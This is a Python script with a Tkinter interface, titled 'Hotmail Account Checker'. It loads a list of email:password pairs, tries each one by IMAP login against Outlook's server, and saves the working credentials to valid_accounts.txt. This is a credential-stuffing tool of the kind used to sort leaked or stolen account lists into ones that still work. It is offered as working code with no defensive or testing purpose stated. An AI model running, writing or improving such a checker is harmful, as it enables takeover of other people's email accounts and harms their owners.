import imaplib
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import threading

def check_hotmail_login(email, password):
    try:
        mail = imaplib.IMAP4_SSL('outlook.office365.com')  # Hotmail/Outlook IMAP server
        mail.login(email, password)
        mail.logout()
        return True  # Login successful
    except:
        return False  # Login failed

def upload_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if not file_path:
        messagebox.showwarning("No File Selected", "Please select a file to proceed.")
        return
    progress_label.config(text="Processing...")
    threading.Thread(target=process_file, args=(file_path,)).start()  # Run in a separate thread

def process_file(file_path):
    output_file = 'valid_accounts.txt'  # File to store valid accounts
    failed_file = 'failed_accounts.txt'  # File to store failed accounts
    
    with open(file_path, 'r') as f:
        accounts = [line.strip().split(':') for line in f.readlines()]
    
    valid_accounts = []
    failed_accounts = []
    total = len(accounts)
    
    for index, (email, password) in enumerate(accounts, start=1):
        progress_label.config(text=f'Checking {index}/{total}: {email}...')
        root.update_idletasks()
        
        if check_hotmail_login(email, password):
            valid_accounts.append(f'{email}:{password}')
        else:
            failed_accounts.append(f'{email}:{password}')
    
    # Save valid and failed accounts to file
    with open(output_file, 'w') as f:
        f.write('\n'.join(valid_accounts))
    with open(failed_file, 'w') as f:
        f.write('\n'.join(failed_accounts))
    
    progress_label.config(text=f'✅ Done! {len(valid_accounts)} valid, {len(failed_accounts)} failed.')
    messagebox.showinfo("Process Complete", "Account checking is done! Check valid_accounts.txt and failed_accounts.txt")

def create_gui():
    global root, progress_label
    root = tk.Tk()
    root.title("Hotmail Account Checker")
    root.geometry("400x200")
    
    label = tk.Label(root, text="Upload your accounts file (.txt)", font=("Arial", 12))
    label.pack(pady=10)
    
    upload_button = tk.Button(root, text="Upload File", command=upload_file, font=("Arial", 10), bg="lightblue")
    upload_button.pack(pady=5)
    
    progress_label = tk.Label(root, text="", font=("Arial", 10))
    progress_label.pack(pady=10)
    
    root.mainloop()

# Start GUI
create_gui()
